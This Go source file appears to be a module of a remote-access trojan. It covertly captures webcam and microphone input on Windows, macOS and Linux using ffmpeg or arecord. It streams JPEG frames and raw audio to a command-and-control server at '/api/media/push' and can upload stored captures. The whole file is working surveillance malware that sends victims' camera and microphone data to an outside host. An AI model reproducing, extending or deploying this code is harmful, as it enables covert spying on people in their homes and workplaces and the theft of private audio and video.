package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"
)

// Live camera / microphone streaming.
//
// Frames are pushed to the C2 over the media channel (POST /api/media/push) and
// fan out to the dashboard over websocket.

var (
	streamMu  sync.Mutex
	camCancel chan struct{}
	micCancel chan struct{}
)

type mediaFrame struct {
	Kind string
	Seq  int
	Fmt  string
	Data []byte
}

// pushFrame sends media bytes as the raw request body — no base64 anywhere.
func pushFrame(f mediaFrame) {
	url := fmt.Sprintf("%s/api/media/push?sid=%s&kind=%s&seq=%d&fmt=%s",
		serverURL, urlq(sid()), f.Kind, f.Seq, f.Fmt)
	ctype := "application/octet-stream"
	if f.Fmt == "jpeg" {
		ctype = "image/jpeg"
	}
	postRaw(url, f.Data, ctype)
}

func urlq(s string) string {
	return strings.ReplaceAll(s, " ", "%20")
}

// postRaw posts a binary body, discarding the response.
func postRaw(url string, body []byte, ctype string) {
	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", ctype)
	req.Header.Set("User-Agent", userAgent)
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
}

// uploadBlob stores a capture server-side and returns its URL.
func uploadBlob(kind, name string, body []byte) (string, error) {
	url := fmt.Sprintf("%s/api/media/upload?sid=%s&kind=%s&name=%s",
		serverURL, urlq(sid()), kind, urlq(name))
	req, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", userAgent)
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	var out struct {
		URL string `json:"url"`
	}
	if err := json.Unmarshal(raw, &out); err != nil {
		return "", err
	}
	if out.URL == "" {
		return "", fmt.Errorf("upload rejected")
	}
	return out.URL, nil
}

// uploadResult wraps an upload into a Result containing a JSON link.
func uploadResult(kind, name string, body []byte) Result {
	u, err := uploadBlob(kind, name, body)
	if err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	b, _ := json.Marshal(map[string]interface{}{
		"kind": kind, "name": name, "url": u, "size": len(body)})
	return Result{OK: true, Out: string(b)}
}

func ffmpegBin() string {
	if p, err := exec.LookPath("ffmpeg"); err == nil {
		return p
	}
	return ""
}

// listDevices returns (video, audio) capture devices.
func listDevices() ([]string, []string) {
	var videos, audios []string
	if runtime.GOOS != "windows" {
		for i := 0; i < 4; i++ {
			if _, err := os.Stat(fmt.Sprintf("/dev/video%d", i)); err == nil {
				videos = append(videos, fmt.Sprintf("/dev/video%d", i))
			}
		}
		return videos, []string{"default"}
	}
	bin := ffmpegBin()
	if bin == "" {
		return nil, nil
	}
	out, _ := exec.Command(bin, "-hide_banner", "-list_devices", "true",
		"-f", "dshow", "-i", "dummy").CombinedOutput()
	for _, line := range strings.Split(string(out), "\n") {
		if !strings.Contains(line, `"`) {
			continue
		}
		parts := strings.Split(line, `"`)
		if len(parts) < 2 {
			continue
		}
		name := parts[1]
		if strings.Contains(line, "(video)") {
			videos = append(videos, name)
		} else if strings.Contains(line, "(audio)") {
			audios = append(audios, name)
		}
	}
	return videos, audios
}

// ---------- camera ----------

func camStreamStart(fps, width int, device string) Result {
	streamMu.Lock()
	if camCancel != nil {
		streamMu.Unlock()
		return Result{OK: true, Out: "camera already streaming"}
	}
	cancel := make(chan struct{})
	camCancel = cancel
	streamMu.Unlock()

	if fps <= 0 || fps > 15 {
		fps = 2
	}
	if width <= 0 || width > 1280 {
		width = 640
	}

	bin := ffmpegBin()
	if bin == "" {
		camStreamStop()
		return Result{OK: false, Err: "ffmpeg not found on target (winget install Gyan.FFmpeg / apt install ffmpeg)"}
	}
	videos, _ := listDevices()
	if device == "" {
		if len(videos) == 0 {
			camStreamStop()
			return Result{OK: false, Err: "no camera device found"}
		}
		device = videos[0]
	}

	var args []string
	if runtime.GOOS == "windows" {
		args = []string{"-hide_banner", "-loglevel", "error", "-f", "dshow",
			"-rtbufsize", "20M", "-i", "video=" + device}
	} else if runtime.GOOS == "darwin" {
		args = []string{"-hide_banner", "-loglevel", "error", "-f", "avfoundation",
			"-framerate", "30", "-i", "0"}
	} else {
		args = []string{"-hide_banner", "-loglevel", "error", "-f", "video4linux2",
			"-i", device}
	}
	args = append(args, "-vf", fmt.Sprintf("fps=%d,scale=%d:-2", fps, width),
		"-f", "mjpeg", "-q:v", "6", "pipe:1")

	cmd := exec.Command(bin, args...)
	hardenCmd(cmd)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		camStreamStop()
		return Result{OK: false, Err: err.Error()}
	}
	if err := cmd.Start(); err != nil {
		camStreamStop()
		return Result{OK: false, Err: err.Error()}
	}

	go func() {
		defer cmd.Wait()
		readJPEGStream(stdout, cancel, device)
		streamMu.Lock()
		if camCancel == cancel {
			camCancel = nil
		}
		streamMu.Unlock()
	}()
	return Result{OK: true, Out: "camera streaming from " + device}
}

func camStreamStop() Result {
	streamMu.Lock()
	if camCancel != nil {
		close(camCancel)
		camCancel = nil
	}
	streamMu.Unlock()
	return Result{OK: true, Out: "camera stopped"}
}

// readJPEGStream splits a MJPEG pipe into discrete JPEG images.
func readJPEGStream(r io.Reader, cancel chan struct{}, device string) {
	br := bufio.NewReaderSize(r, 1<<20)
	seq := 0
	for {
		select {
		case <-cancel:
			return
		default:
		}
		frame, err := readOneJPEG(br)
		if err != nil {
			return
		}
		if len(frame) < 512 {
			continue
		}
		seq++
		pushFrame(mediaFrame{Kind: "cam", Seq: seq, Fmt: "jpeg", Data: frame})
	}
}

func readOneJPEG(br *bufio.Reader) ([]byte, error) {
	var buf bytes.Buffer
	for {
		b, err := br.ReadByte()
		if err != nil {
			return nil, err
		}
		if b != 0xFF {
			continue
		}
		n, err := br.ReadByte()
		if err != nil {
			return nil, err
		}
		if n == 0xD8 {
			buf.Write([]byte{0xFF, 0xD8})
			break
		}
	}
	var prev byte
	for {
		b, err := br.ReadByte()
		if err != nil {
			return nil, err
		}
		buf.WriteByte(b)
		if prev == 0xFF && b == 0xD9 {
			return buf.Bytes(), nil
		}
		prev = b
	}
}


// ---------- microphone ----------

func micStreamStart(device string) Result {
	streamMu.Lock()
	if micCancel != nil {
		streamMu.Unlock()
		return Result{OK: true, Out: "microphone already streaming"}
	}
	cancel := make(chan struct{})
	micCancel = cancel
	streamMu.Unlock()

	var cmd *exec.Cmd
	bin := ffmpegBin()

	if runtime.GOOS == "windows" {
		if bin == "" {
			micStreamStop()
			return Result{OK: false, Err: "ffmpeg not found on target (winget install Gyan.FFmpeg)"}
		}
		_, audios := listDevices()
		if device == "" {
			if len(audios) == 0 {
				micStreamStop()
				return Result{OK: false, Err: "no microphone device found"}
			}
			device = audios[0]
		}
		cmd = exec.Command(bin, "-hide_banner", "-loglevel", "error",
			"-f", "dshow", "-i", "audio="+device,
			"-ac", "1", "-ar", "16000", "-f", "s16le", "pipe:1")
	} else if runtime.GOOS == "darwin" {
		if bin == "" {
			micStreamStop()
			return Result{OK: false, Err: "ffmpeg not found"}
		}
		cmd = exec.Command(bin, "-hide_banner", "-loglevel", "error",
			"-f", "avfoundation", "-i", ":0", "-ac", "1", "-ar", "16000",
			"-f", "s16le", "pipe:1")
	} else if bin != "" {
		if device == "" {
			device = "default"
		}
		cmd = exec.Command(bin, "-hide_banner", "-loglevel", "error",
			"-f", "alsa", "-i", device, "-ac", "1", "-ar", "16000",
			"-f", "s16le", "pipe:1")
	} else if p, err := exec.LookPath("arecord"); err == nil {
		cmd = exec.Command(p, "-q", "-t", "raw", "-f", "S16_LE",
			"-r", "16000", "-c", "1", "-D", "default")
	} else {
		micStreamStop()
		return Result{OK: false, Err: "no audio capture tool (need ffmpeg or arecord)"}
	}

	hardenCmd(cmd)
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		micStreamStop()
		return Result{OK: false, Err: err.Error()}
	}
	if err := cmd.Start(); err != nil {
		micStreamStop()
		return Result{OK: false, Err: err.Error()}
	}

	go func() {
		defer cmd.Wait()
		defer func() {
			streamMu.Lock()
			if micCancel == cancel {
				micCancel = nil
			}
			streamMu.Unlock()
		}()
		buf := make([]byte, 3200) // 100ms @ 16kHz mono s16
		seq := 0
		for {
			select {
			case <-cancel:
				return
			default:
			}
			n, err := io.ReadFull(stdout, buf)
			if n > 0 {
				seq++
				pushFrame(mediaFrame{Kind: "mic", Seq: seq, Fmt: "pcm", Data: buf[:n]})
			}
			if err != nil {
				return
			}
		}
	}()

	label := device
	if label == "" {
		label = "default"
	}
	time.Sleep(50 * time.Millisecond)
	return Result{OK: true, Out: "microphone streaming from " + label}
}

func micStreamStop() Result {
	streamMu.Lock()
	if micCancel != nil {
		close(micCancel)
		micCancel = nil
	}
	streamMu.Unlock()
	return Result{OK: true, Out: "microphone stopped"}
}

func streamStatus() Result {
	streamMu.Lock()
	defer streamMu.Unlock()
	return Result{OK: true, Out: fmt.Sprintf(`{"cam":%v,"mic":%v}`,
		camCancel != nil, micCancel != nil)}
}

